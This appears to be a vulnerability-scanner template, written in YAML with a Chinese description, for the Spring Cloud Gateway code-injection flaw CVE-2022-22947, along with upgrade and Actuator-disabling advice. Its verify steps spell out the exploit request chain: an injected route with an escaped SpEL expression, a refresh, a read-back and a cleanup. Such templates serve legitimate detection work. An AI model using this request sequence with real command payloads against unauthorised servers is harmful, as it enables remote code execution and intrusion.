app: Spring
query: app:"Java"
meta:
  name: Spring Cloud Gateway 远程代码执行漏洞（CVE-2022-22947）
  level: 4
  tags:
    - remote_code_execution
  description: |4-
        Spring Cloud Gateway 是基于 Spring Framework 和 Spring Boot 构建的 API 网关，它旨在为微服务架构提供一种简单、有效、统一的 API 路由管理方式。
  
              Spring官方博客发布了一篇关于Spring Cloud Gateway的CVE报告，据公告描述，当启用和暴露 Gateway Actuator 端点时，使用 Spring Cloud Gateway 的应用程序可受到代码注入攻击。攻击者可以发送特制的恶意请求，从而远程执行任意代码。
  homepage: https://spring.io/
  author: Administrator
  references: https://blog.csdn.net/qq_36197704/article/details/123344997
  solution: |-
    1）3.1.x用户应升级到3.1.1+；
    
    2）3.0.x用户应升级到3.0.7+；
    3）如果不需要Actuator功能，可以通过management.endpoint.gateway.enable：false配置将其禁用。
  steps:
    variable:
      - r1: ' randomLowercase(5)'
    verify_steps:
      type: and
      verify:
        - request:
            method: POST
            path: /actuator/gateway/routes/{{r1}}
            redirect: false
            header:
              - ' Content-Type': application/json
            params: '{"id":"{{r1}}","filters":[{"name":"AddResponseHeader","args":{"name":"Result","value":"\u0023\u007B999\u002A999\u007D"}}],"uri":"http://example.com","order":0}'
          response:
            - name: body
              value: "998001"
              type: contains
        - request:
            method: POST
            path: /actuator/gateway/refresh
            redirect: false
            header: [ ]
            params: ""
          response:
            - name: body
              value: "998001"
              type: contains
        - request:
            method: GET
            path: /actuator/gateway/routes/{{r1}}
            redirect: false
            header: [ ]
            params: ""
          response:
            - name: body
              value: "998001"
              type: contains
        - request:
            method: DELETE
            path: /actuator/gateway/routes/{{r1}}
            redirect: false
            header: [ ]
            params: ""
          response:
            - name: body
              value: "998001"
              type: contains
        - request:
            method: POST
            path: /actuator/gateway/refresh
            redirect: true
            header: [ ]
            params: ""
          response:
            - name: body
              value: "998001"
              type: contains
  create_at: "2022-05-24 17:02:31"
